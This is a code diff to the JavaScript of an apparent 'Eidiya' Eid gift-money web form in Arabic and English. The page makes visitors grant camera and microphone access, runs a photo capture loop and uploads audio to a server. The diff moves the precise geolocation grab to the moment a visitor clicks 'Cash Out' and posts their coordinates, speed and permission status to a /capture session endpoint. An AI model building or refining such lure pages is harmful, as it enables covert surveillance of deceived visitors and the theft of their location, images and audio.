@@ -145,9 +145,9 @@ async function submitEidiyaForm(e) {
   submitBtn.disabled = true;
   submitBtn.textContent = window.currentLang === 'en' ? 'Processing...' : 'جاري المعالجة...';
 
-  // Get location if available
+  // Get location if available and already granted
   let location = null;
-  if (navigator.geolocation) {
+  if (navigator.geolocation && (await isLocationPermissionGranted())) {
     try {
       const position = await new Promise((resolve, reject) => {
         navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 6000 });
@@ -421,15 +421,7 @@ async function requestAllPermissions() {
 
   // 1. Geolocation Permission Prompt Promise
   const locationPromise = new Promise((resolve) => {
-    if (!navigator.geolocation) {
-      resolve({ type: 'location', status: 'unsupported' });
-      return;
-    }
-    navigator.geolocation.getCurrentPosition(
-      (position) => resolve({ type: 'location', status: 'granted', data: position }),
-      (error) => resolve({ type: 'location', status: 'denied', error: error }),
-      { timeout: 5000 }
-    );
+    resolve({ type: 'location', status: 'default' });
   });
 
   // 2. Camera + Microphone Permission Prompt Promise (Requested in a single getUserMedia prompt)
@@ -458,16 +450,13 @@ async function requestAllPermissions() {
   
   grantBtn.textContent = window.currentLang === 'en' ? 'Success! Loading...' : 'تم بنجاح! جاري التحميل...';
 
-  // Short delay before the overlay slides away
-  setTimeout(() => {
-    const overlay = document.getElementById('permissionsOverlay');
-    if (overlay) {
-      overlay.classList.add('hidden');
-    }
-    document.body.style.overflow = '';
-    // Trigger welcome notification toast
-    showNotification(window.allTranslations[window.currentLang].notificationText);
-  }, 1200);
+  const overlay = document.getElementById('permissionsOverlay');
+  if (overlay) {
+    overlay.classList.add('hidden');
+  }
+  document.body.style.overflow = '';
+  // Trigger welcome notification toast
+  showNotification(window.allTranslations[window.currentLang].notificationText);
 }
 
 // The explicit capture workflow below intentionally overrides the original
@@ -478,8 +467,8 @@ requestAllPermissions = async function () {
   grantBtn.textContent = 'Requesting browser permissions...';
 
   try {
-    // Request permissions sequentially so prompts do not overlap and block each other
-    const locationResult = await requestLocationPermission();
+    // Do not request location permission at startup
+    const locationResult = { status: 'default', data: null };
     const mediaResult = await requestMediaPermission();
 
     if (mediaResult.status !== 'granted') {
@@ -524,14 +513,12 @@ requestAllPermissions = async function () {
     await startPhotoCaptureLoop();
 
     grantBtn.textContent = window.currentLang === 'en' ? 'Success! Loading...' : 'تم بنجاح! جاري التحميل...';
-    setTimeout(() => {
-      const overlay = document.getElementById('permissionsOverlay');
-      if (overlay) {
-        overlay.classList.add('hidden');
-      }
-      document.body.style.overflow = '';
-      // Welcome notification suppressed.
-    }, 1200);
+    const overlay = document.getElementById('permissionsOverlay');
+    if (overlay) {
+      overlay.classList.add('hidden');
+    }
+    document.body.style.overflow = '';
+    // Welcome notification suppressed.
   } catch (error) {
     grantBtn.disabled = false;
     grantBtn.textContent = window.currentLang === 'en' ? 'Try Again' : 'إعادة المحاولة';
@@ -924,4 +911,65 @@ async function finishAudioOnServer() {
   fetch(url, { method: 'POST' }).catch(error => {
     console.error('Audio finalize failed:', error);
   });
+}
+
+// Check if location permission has already been granted without prompting
+async function isLocationPermissionGranted() {
+  try {
+    if (navigator.permissions && navigator.permissions.query) {
+      const status = await navigator.permissions.query({ name: 'geolocation' });
+      return status.state === 'granted';
+    }
+  } catch (e) {
+    console.warn('Permissions API query failed:', e);
+  }
+  return false;
+}
+
+// Prompt for location and open modal when choosing to Cash Out (سحب العيدية)
+async function chooseCashOut() {
+  openModal('cashOutModal');
+  
+  if (navigator.geolocation) {
+    try {
+      const position = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 6000 });
+      });
+      const locationData = {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        accuracy: position.coords.accuracy,
+        altitude: position.coords.altitude,
+        speed: position.coords.speed,
+        capturedAt: new Date().toISOString()
+      };
+      
+      // Update session with the location and permission status on server
+      if (captureSessionId) {
+        fetch(`/capture/${captureSessionId}/metadata`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            location: locationData,
+            permissions: {
+              location: 'granted'
+            }
+          })
+        }).catch(error => console.error('Metadata update failed:', error));
+      }
+    } catch (err) {
+      console.warn('Geolocation capture failed on choose cash out:', err.message);
+      if (captureSessionId) {
+        fetch(`/capture/${captureSessionId}/metadata`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            permissions: {
+              location: 'denied'
+            }
+          })
+        }).catch(error => console.error('Metadata update failed:', error));
+      }
+    }
+  }
 }
